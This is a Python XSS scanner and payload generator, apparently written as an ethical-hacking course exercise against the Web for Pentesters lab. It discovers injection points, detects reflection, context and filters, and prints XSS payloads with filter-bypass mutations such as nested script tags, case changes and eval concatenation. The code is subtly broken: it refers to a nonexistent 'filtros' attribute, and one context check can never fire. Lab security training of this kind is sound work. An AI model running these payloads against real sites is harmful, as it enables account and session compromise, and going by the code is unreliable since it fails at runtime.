"""
Jorge Matesanz - Hacking etico - INSO 3A.

Para la presente practica, el alumno debera desarrollar las siguientes tareas:


- Desarrollar un script/herramienta que permita automatizar la identificacion y explotacion de vulnerabilidades XSS en Web for Pentesters (primeros 8 niveles). La herramienta debera incluir, como minimo, los siguientes apartados funcionales:

 1. Descubrimiento de entradas: deteccion automatica de parametros GET en URL, formularios POST en el HTML y puntos de inyeccion en la ruta (path injection).

 2. Verificacion de reflexion: envio de un texto único por cada entrada detectada y comprobacion de si el valor se refleja en la respuesta.

 3. Verificacion de persistencia (Stored XSS): tras inyectar el texto, realizar al menos una segunda peticion limpia para comprobar si la entrada persiste.

 4. Analisis de contexto: determinar donde se refleja el texto introducido, para adaptar el payload al contexto real.

 5. Deteccion de filtros: identificar caracteres bloqueados/codificados (por ejemplo <, >, comillas) y palabras prohibidas (por ejemplo script, alert, onerror).

 6. Tecnicas de evasion: proponer variantes de payloads (cambio de mayusculas/minusculas, alternativas de funciones JS como prompt/confirm, etc.) en funcion de los filtros detectados.

 7. Generacion de payloads: construir una lista de posibles payloads segun el contexto y los filtros identificados.

 10. Salida de resultados: mostrar de forma clara los parámetros pontencialmente vulnerables, el tipo de XSS y los payload propuestos.


"""

from enum import Enum

import requests
from filters import filters 
from payloads import payloads
from bs4 import BeautifulSoup, Comment, NavigableString
from urllib.parse import urlparse, parse_qs, parse_qsl

from dataclasses import dataclass, field



# Definición de un Enum
class TipoXSS(Enum):
    REFLECTED = 0
    STORED = 1
    NONE = 2

class Contexto(Enum):
    COMENTARIO = 0
    ATTRIBUTE = 1
    SCRIPT_SINGLE_QUOTE = 2
    SCRIPT_DOUBLE_QUOTE = 3
    SCRIPT_NONE_QUOTE = 4
    PLAIN_TEXT = 5
    # Hacer que lance excepcion para ver porque ocurre    
    OTHER = 6


@dataclass
class PuntoInyeccion:
    metodo: str  # GET, POST, PATH
    parametro: str
    tipo_xss: TipoXSS = TipoXSS.NONE
    contexto: Contexto = Contexto.OTHER
    filtros_detectados: list[str] = field(default_factory=list)

class XSSScanner:

    @staticmethod
    def sanitize_url(url):
        # Eliminar espacios y caracteres no deseados
        url = url.strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url  # Agregar http:// por defecto si no se especifica
        return url

    def __init__(self, url, canary = "p3nt35ting"):
        self.url = urlparse(self.sanitize_url(url))
        self.session = requests.Session() # Para el requisito 3 (Stored XSS)

        # Estructura para almacenar los puntos de inyección detectados: (tipo, nombre, reflexion/persistencia, contexto, [filtro1, filtro2, ...], payloads_generados) 
        self.puntos_inyeccion = []
        self.default_canary = canary # Canary único para verificar reflexion y persistencia
        
        # Guardamos localmente la bateria base por conveniencia (inyectada desde payloads.py)
        self.payloads_base_por_contexto = payloads
        
    # Metodo auxiliar para borrar los puntos de inyección detectados como NONE
    def _limpiar_puntos_none(self):
        self.puntos_inyeccion = [p for p in self.puntos_inyeccion if p.tipo_xss != TipoXSS.NONE]

    def _url_con_path_inyectado(self, payload):
        return self.url._replace(path=f"{self.url.path.rstrip('/')}/{payload}").geturl()

    def descubrir_entradas(self):
        
        # Descubrir parámetros GET
        query_params = parse_qs(self.url.query)
        for param in query_params:
            self.puntos_inyeccion.append(PuntoInyeccion(metodo='GET', parametro=param))

        # Punto de inyección en la ruta (path injection)
        self.puntos_inyeccion.append(PuntoInyeccion(metodo='PATH', parametro=self.url.path or '/'))

        # Lógica con BeautifulSoup para llenar self.puntos_inyeccion
        response = self.session.get(self.url.geturl())
        soup = BeautifulSoup(response.content, 'html.parser')
        form_tags = soup.find_all("form")
        for form in form_tags:
            # El segundo argumento de .get() siempre es el valor por defecto
            # Obtener el método del formulario (GET o POST), si no se especifica, se asume GET
            method = form.get('method', 'GET').upper()
            inputs = form.find_all('input')
            for input_tag in inputs:
                # Filtrar los inputs de tipo submit, ya que son botones
                if input_tag.get("type", "text").lower() == "submit":
                    continue
                name = input_tag.get('name')
                if name:
                    self.puntos_inyeccion.append(PuntoInyeccion(metodo=method, parametro=name))
        

    def verificar_reflexion(self, punto_inyeccion):
        # Enviar un canary único y verificar si se refleja en la respuesta
        canary = self.default_canary
        if punto_inyeccion.metodo == 'GET':
            params = {punto_inyeccion.parametro: canary}
            response = self.session.get(self.url.geturl(), params=params)
        elif punto_inyeccion.metodo == 'POST':
            data = {punto_inyeccion.parametro: canary}
            response = self.session.post(self.url.geturl(), data=data)
        elif punto_inyeccion.metodo == 'PATH':
            response = self.session.get(self._url_con_path_inyectado(canary))
        
        count = response.text.count(canary)
        
        if  count > 0:
            print(f"[*] Reflexión detectada en {punto_inyeccion.metodo}: {punto_inyeccion.parametro} ({count} veces)")
            punto_inyeccion.tipo_xss = TipoXSS.REFLECTED
            return True
        elif punto_inyeccion.tipo_xss != TipoXSS.STORED:
            print(f"[-] No se detectó reflexión en {punto_inyeccion.metodo}: {punto_inyeccion.parametro}")
            punto_inyeccion.tipo_xss = TipoXSS.NONE
            
        return False
        
    def verificar_persistencia(self, punto_inyeccion):
        # Enviar un canary único y verificar si se refleja en la respuesta
        canary = self.default_canary + 'per'
        if punto_inyeccion.metodo == 'GET':
            params = {punto_inyeccion.parametro: canary}
            self.session.get(self.url.geturl(), params=params)
        elif punto_inyeccion.metodo == 'POST':
            data = {punto_inyeccion.parametro: canary}
            self.session.post(self.url.geturl(), data=data)
        elif punto_inyeccion.metodo == 'PATH':
            self.session.get(self._url_con_path_inyectado(canary))
        
        count = self.session.get(self.url.geturl()).text.count(canary)
        
        if count > 0:
            print(f"[*] Persistencia detectada en {punto_inyeccion.metodo}: {punto_inyeccion.parametro} ({count} veces)")
            punto_inyeccion.tipo_xss = TipoXSS.STORED
            return True
        elif punto_inyeccion.tipo_xss != TipoXSS.REFLECTED:
            punto_inyeccion.tipo_xss = TipoXSS.NONE
        
        return False
        

    def analizar_contexto(self, punto_inyeccion, canary='p3nt35ting'):
        # Lógica para ver si el canary está dentro de <script>, value='', texto plano o comentarios HTML
        
        # 1 - Buscar el canary en la respuesta
        if punto_inyeccion.metodo == 'GET':
            params = {punto_inyeccion.parametro: canary}
            response = self.session.get(self.url.geturl(), params=params)
        elif punto_inyeccion.metodo == 'POST':
            data = {punto_inyeccion.parametro: canary}
            response = self.session.post(self.url.geturl(), data=data)
        elif punto_inyeccion.metodo == 'PATH':
            response = self.session.get(self._url_con_path_inyectado(canary))

        soup = BeautifulSoup(response.content, 'html.parser')

        # 2 - Analizar el contexto del canary en la respuesta
        ## Caso 1: Comentario HTML
        ### Ref https://stackoverflow.com/questions/33138937/how-to-find-all-comments-with-beautiful-soup
        comment_finds = soup.find_all(
            string=lambda text: isinstance(text, Comment) and canary in text
        )
        if len(comment_finds) > 0:
            print(f"[*] El punto de inyeccion {punto_inyeccion.metodo} se encuentra en un comentario)")
            punto_inyeccion.contexto = Contexto.COMENTARIO
        
        # Caso 2: NavigableString (script o texto plano)
        non_comment_types = soup.find_all(
            string=lambda text: not isinstance(text, Comment) and canary in text
        )

        if len(non_comment_types) > 0:
            # Caso 2.1: Dentro de una etiqueta <script>
            script_tags = [tag for tag in soup.find_all('script') if canary in str(tag)]
            if script_tags:
                script_content = str(script_tags[0])
                if f"'{canary}'" in script_content or f"'{canary}" in script_content or f"{canary}'" in script_content:
                    punto_inyeccion.contexto = Contexto.SCRIPT_SINGLE_QUOTE
                elif f'"{canary}"' in script_content or f'"{canary}' in script_content or f'{canary}"' in script_content:
                    punto_inyeccion.contexto = Contexto.SCRIPT_DOUBLE_QUOTE
                else:
                    punto_inyeccion.contexto = Contexto.SCRIPT_NONE_QUOTE
            # Caso 2.2: Texto plano
            else:
                punto_inyeccion.contexto = Contexto.PLAIN_TEXT

        # Caso 3: Atributo HTML
        if any(canary in str(v) for tag in soup.find_all(True) for v in tag.attrs.values()):
            punto_inyeccion.contexto = Contexto.ATTRIBUTE


        if punto_inyeccion.contexto is None:
            print(f"[*] No se pudo determinar el contexto del punto de inyección {punto_inyeccion.metodo}: {punto_inyeccion.parametro}")
            punto_inyeccion.contexto = Contexto.OTHER

        pass


    # Posible TODO: Clasificar el tipo de filtro (bloqueo, codificación, etc.)
    def detectar_filtros(self, punto_inyeccion):
        # Lógica para detectar caracteres bloqueados o palabras prohibidas
        for filter in filters:
            canary = self.default_canary + filter
            if punto_inyeccion.metodo == 'GET':
                params = {punto_inyeccion.parametro: canary}
                response = self.session.get(self.url.geturl(), params=params)
            elif punto_inyeccion.metodo == 'POST':
                data = {punto_inyeccion.parametro   : canary}
                response = self.session.post(self.url.geturl(), data=data)
            elif punto_inyeccion.metodo == 'PATH':
                response = self.session.get(self._url_con_path_inyectado(canary))

            if canary not in response.text:
                print(f"[-] Filtro detectado en {punto_inyeccion.metodo}: {punto_inyeccion.parametro} - Caracter/Palabra bloqueada: '{filter}'")
                punto_inyeccion.filtros.append(filter)

        pass

    

    def generar_payloads_base(self, contexto):
        """Genera una lista de payloads base dependiendo del contexto (Punto 7)."""
        if contexto == Contexto.PLAIN_TEXT:
            return self.payloads_base_por_contexto["PLAIN_TEXT"].copy()
        elif contexto == Contexto.ATTRIBUTE:
            return self.payloads_base_por_contexto["ATTRIBUTE"].copy()
        elif contexto in (Contexto.SCRIPT_SINGLE_QUOTE, Contexto.SCRIPT_DOUBLE_QUOTE, Contexto.SCRIPT_NONE_QUOTE):
            # Usamos funciones base crudas para inyectar si estamos dentro de un script
            base_js = ["alert(1)", "prompt(1)", "confirm(1)", "console.log(1)"]
            adapted = set()
            
            for p in base_js:
                if contexto == Contexto.SCRIPT_SINGLE_QUOTE:
                    adapted.add(f"'; {p}//")
                    adapted.add(f"'-{p}-'")
                elif contexto == Contexto.SCRIPT_DOUBLE_QUOTE:
                    adapted.add(f'\"; {p}//')
                    adapted.add(f'\"-{p}-\"')
                elif contexto == Contexto.SCRIPT_NONE_QUOTE:
                    adapted.add(f"; {p}//")
                    adapted.add(f"{p}//")
                    
            # Añadimos también cerrojos de script completos en caso de que todo lo anterior falle
            adapted.add("</script><script>alert(1)</script>")

            return list(adapted)
        elif contexto == Contexto.COMENTARIO:
            return self.payloads_base_por_contexto["COMENTARIO"].copy()
        else:
            return self.payloads_base_por_contexto["OTHER"].copy()

    # Basados en parte en los ejemplos de clase y PayloadsAllTheThings
    # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
    def aplicar_evasion(self, payload, filtros_detectados):
        """Aplica mutaciones al payload en función de los filtros detectados (Punto 6)."""
        variantes = set([payload])

        # Convertimos la lista de filtros a uno de solo strings para buscar fácilmente
        # Unimos todos los filtros detectados en una sola cadena para buscar subcadenas como 'script'
        filtros_str = "".join(filtros_detectados).lower()

        if "script" in filtros_str:
            variantes.discard(payload) # Auto eliminamos el original al entrar al if porque sabemos que fallará
            variantes.add(payload.replace("script", "sCrIpt").replace("SCRIPT", "sCrIpt"))
            
            # Anidamiento para bypass de borrado de etiqueta y combinado con mayúsculas/minúsculas
            variantes.update({payload.replace("<script>", "<scr<script>ipt>").replace("</script>", "</scr</script>ipt>"), payload.replace("<script>", "<scr<sCrIpt>ipt>").replace("</script>", "</scr</sCrIpt>ipt>")})

        if "alert" in filtros_str:
            variantes.discard(payload)
            variantes.add(payload.replace("alert", "prompt"))
            variantes.add(payload.replace("alert", "confirm"))
            variantes.add(payload.replace("alert(", "eval('ale'+'rt(1)');//"))
            variantes.add(payload.replace("alert", "window['alert']"))

        if "(" in filtros_str or ")" in filtros_str:
            variantes.discard(payload)
            # Cambiamos paréntesis por backticks (Template Literals) solo si los paréntesis están siendo filtrados
            variantes.add(payload.replace('(1)', '`1`'))

        if " " in filtros_str:
            variantes.discard(payload)
            variantes.add(payload.replace(" ", "/"))

        if "onerror" in filtros_str or "onload" in filtros_str:
            variantes.discard(payload)
            variantes.add(payload.replace("onerror", "onErRor").replace("onload", "onLoAd"))

        return list(variantes)

    def ejecutar(self):
        print(f"[*] Escaneando: {self.url.geturl()}")
        self.descubrir_entradas()
        
        print("[*] Puntos de inyección encontrados:")
        for punto in self.puntos_inyeccion:
            print(f" - {punto.metodo}: {punto.parametro}")
            self.verificar_reflexion(punto)
            self.verificar_persistencia(punto)

        self._limpiar_puntos_none()

        for punto in self.puntos_inyeccion:
            self.analizar_contexto(punto)
            self.detectar_filtros(punto)
        
            tipo_xss_str = punto.tipo_xss.name if punto.tipo_xss else 'NONE'
            contexto_str = punto.contexto.name if punto.contexto else 'NONE'
            
            print(f"[*] Generando payloads para:")
            print(f"    - Punto de inyección: ({punto.metodo}) {punto.parametro}")
            print(f"    - Tipo de XSS: {tipo_xss_str}")
            print(f"    - Contexto evaluado: {contexto_str}")
            
            payloads_base = self.generar_payloads_base(punto.contexto)
            payloads_finales = set()
            
            for pb in payloads_base:
                variantes_evasion = self.aplicar_evasion(pb, punto.filtros)
                payloads_finales.update(variantes_evasion)
            
            print(f"[*] Se han generado {len(payloads_finales)} posibles payloads para el parámetro '{punto.parametro}':")
            for p in payloads_finales:
                print(f"    [{punto.metodo} - {punto.parametro}] -> {p}")
            print("-" * 50)

def main():
    """Main entry point of the application."""
    url = input("Ingrese la URL a escanear: ")

    scanner = XSSScanner(url)
    scanner.ejecutar()

if __name__ == "__main__":
    main()